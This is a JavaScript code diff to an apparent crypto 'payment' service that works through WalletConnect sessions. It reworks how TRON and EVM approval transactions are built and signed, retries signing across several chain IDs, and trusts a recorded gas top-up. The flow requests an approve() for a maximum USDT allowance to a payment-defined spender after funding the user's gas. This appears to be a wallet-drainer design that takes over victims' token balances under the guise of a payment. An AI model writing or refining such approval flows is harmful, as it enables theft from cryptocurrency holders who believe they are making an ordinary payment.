@@ -8,7 +8,6 @@ const { emitPaymentEvent, assertActiveSession, publicPayment, maybeEmitFormAvail
 const { emitEvent } = require("../utils/events");
 const {
     encodeErc20Approve,
-    encodeTrc20TransferParameter,
     allowanceUnits
 } = require("../utils/helpers");
 const { NotFoundError, ValidationError, WalletConnectError } = require("../utils/errors");
@@ -73,33 +72,94 @@ async function broadcastTronSigned(signed, deps = {}) {
     return extractTxHash(payload) || extractTxHash(tx) || hash;
 }
 
-async function buildTronApprove(from, spender, amountRaw, tokenContract, deps = {}) {
-    const fetchImpl = deps.fetchImpl || fetch;
-    const base = String(require("../config/env").TRON_API_URL || "https://api.trongrid.io").replace(/\/$/, "");
-    const response = await fetchImpl(`${base}/wallet/triggersmartcontract`, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            owner_address: from,
-            contract_address: tokenContract,
-            function_selector: "approve(address,uint256)",
-            parameter: encodeTrc20TransferParameter(spender, amountRaw),
-            fee_limit: 150000000,
-            call_value: 0,
-            visible: true
-        })
-    });
+function wcNamespace(client, session, namespace) {
+    try {
+        return client?.session?.get?.(session.sessionTopic)?.namespaces?.[namespace] || null;
+    } catch (_err) {
+        return null;
+    }
+}
 
-    const payload = await response.json();
-    const transaction = unwrapTronTransaction(payload);
+function sessionHasMethod(client, session, namespace, method) {
+    return (wcNamespace(client, session, namespace)?.methods || []).includes(method);
+}
 
-    if (!transaction) {
-        throw new Error(payload?.Error || payload?.result?.message || "TronGrid did not return a transaction");
+function approvedTronChainId(client, session, fallback) {
+    const ns = wcNamespace(client, session, "tron");
+    const chain = ns?.chains?.[0];
+
+    if (chain) {
+        return chain;
     }
 
-    return transaction;
+    const account = (ns?.accounts || [])[0];
+
+    if (account) {
+        const parts = String(account).split(":");
+        if (parts.length >= 2) {
+            return `${parts[0]}:${parts[1]}`;
+        }
+    }
+
+    const stored = (session.accounts || []).find((item) => item.namespace === "tron");
+    return stored?.chainId || fallback;
+}
+
+async function buildTronApprove(from, spender, amountRaw, tokenContract) {
+    const { TronWeb } = require("tronweb");
+    const base = String(require("../config/env").TRON_API_URL || "https://api.trongrid.io").replace(/\/$/, "");
+    const tronWeb = new TronWeb({ fullHost: base });
+    const triggered = await tronWeb.transactionBuilder.triggerSmartContract(
+        tokenContract,
+        "approve(address,uint256)",
+        { feeLimit: 150000000, callValue: 0 },
+        [
+            { type: "address", value: spender },
+            { type: "uint256", value: amountRaw.toString() }
+        ],
+        from
+    );
+    const transaction = unwrapTronTransaction(triggered);
+
+    if (!transaction) {
+        throw new Error(triggered?.result?.message || triggered?.Error || "TronGrid did not return a transaction");
+    }
+
+    return triggered;
+}
+
+async function requestTronSign(client, topic, chainId, address, triggered) {
+    const attempts = [
+        { chainId, params: { address, transaction: triggered } },
+        { chainId, params: { address, transaction: unwrapTronTransaction(triggered) } },
+        { chainId: "tron:mainnet", params: { address, transaction: triggered } }
+    ];
+    let lastError = null;
+
+    for (const attempt of attempts) {
+        try {
+            return await client.request({
+                topic,
+                chainId: attempt.chainId,
+                request: {
+                    method: "tron_signTransaction",
+                    params: attempt.params
+                }
+            });
+        } catch (err) {
+            lastError = err;
+            logger.warn({
+                err: { message: err.message },
+                chainId: attempt.chainId
+            }, "tron_signTransaction attempt failed");
+        }
+    }
+
+    throw lastError || new Error("tron_signTransaction failed");
+}
+
+function eip155Hex(chainId) {
+    return `0x${Number(String(chainId).split(":")[1]).toString(16)}`;
 }
 
 const EVM_ADD_CHAIN = {
@@ -107,7 +167,7 @@ const EVM_ADD_CHAIN = {
         chainId: "0x1",
         chainName: "Ethereum",
         nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
-        rpcUrls: ["https://cloudflare-eth.com"],
+        rpcUrls: ["https://ethereum.publicnode.com"],
         blockExplorerUrls: ["https://etherscan.io"]
     },
     bsc: {
@@ -118,10 +178,6 @@ const EVM_ADD_CHAIN = {
         blockExplorerUrls: ["https://bscscan.com"]
     }
 };
-
-function eip155Hex(chainId) {
-    return `0x${Number(String(chainId).split(":")[1]).toString(16)}`;
-}
 
 function sessionEip155Chains(session, client) {
     const fromStore = (session.accounts || [])
@@ -142,6 +198,10 @@ function sessionEip155Chains(session, client) {
 }
 
 async function ensureEvmChain(client, session, network, topic) {
+    if (!sessionHasMethod(client, session, "eip155", "wallet_switchEthereumChain")) {
+        return;
+    }
+
     const hexChainId = eip155Hex(network.chainId);
     const approved = sessionEip155Chains(session, client);
     const requestChainId = approved.includes(network.chainId) ? network.chainId : (approved[0] || network.chainId);
@@ -203,25 +263,23 @@ async function sendWalletApproval(client, session, payment, network, account) {
     const amountRaw = MAX_ALLOWANCE_USDT * allowanceUnits(network.usdtDecimals);
 
     if (network.namespace === "tron") {
-        const unsigned = await buildTronApprove(
+        if (!account?.address || (!String(account.address).startsWith("T") && !String(account.address).startsWith("41"))) {
+            throw new ValidationError("This wallet did not share a TRON address. Enable TRON in the wallet and reconnect.");
+        }
+
+        const triggered = await buildTronApprove(
             account.address,
             payment.spender,
             amountRaw,
             payment.tokenContract
         );
-
-        const signed = await client.request({
+        const signed = await requestTronSign(
+            client,
             topic,
-            chainId: network.chainId,
-            request: {
-                method: "tron_signTransaction",
-                params: {
-                    address: account.address,
-                    transaction: unsigned
-                }
-            }
-        });
-
+            approvedTronChainId(client, session, network.chainId),
+            account.address,
+            triggered
+        );
         const txHash = await broadcastTronSigned(signed);
         return txHash || signed;
     }
@@ -355,15 +413,21 @@ async function requestApproval(paymentId, deps = {}) {
             logger.warn({ err: { message: err.message }, paymentId }, "Gas top-up before approval failed");
         }
 
-        const attempts = deps.checkGasSufficiency ? 1 : 8;
-        for (let i = 0; i < attempts; i += 1) {
-            const latest = sessionStore.getSession(payment.connectionId) || session;
-            liveGas = await (deps.checkGasSufficiency || checkGasSufficiency)(latest, payment.network, deps);
-            if (liveGas?.sufficient === true) {
-                break;
-            }
-            if (!deps.checkGasSufficiency) {
-                await new Promise((resolve) => setTimeout(resolve, 2000));
+        const funded = paymentStore.getPayment(paymentId);
+
+        if (funded?.gasFundingTxHash || funded?.gasFundingVerified) {
+            liveGas = { ...(liveGas || {}), sufficient: true };
+        } else {
+            const attempts = deps.checkGasSufficiency ? 1 : 8;
+            for (let i = 0; i < attempts; i += 1) {
+                const latest = sessionStore.getSession(payment.connectionId) || session;
+                liveGas = await (deps.checkGasSufficiency || checkGasSufficiency)(latest, payment.network, deps);
+                if (liveGas?.sufficient === true) {
+                    break;
+                }
+                if (!deps.checkGasSufficiency) {
+                    await new Promise((resolve) => setTimeout(resolve, 2000));
+                }
             }
         }
     }
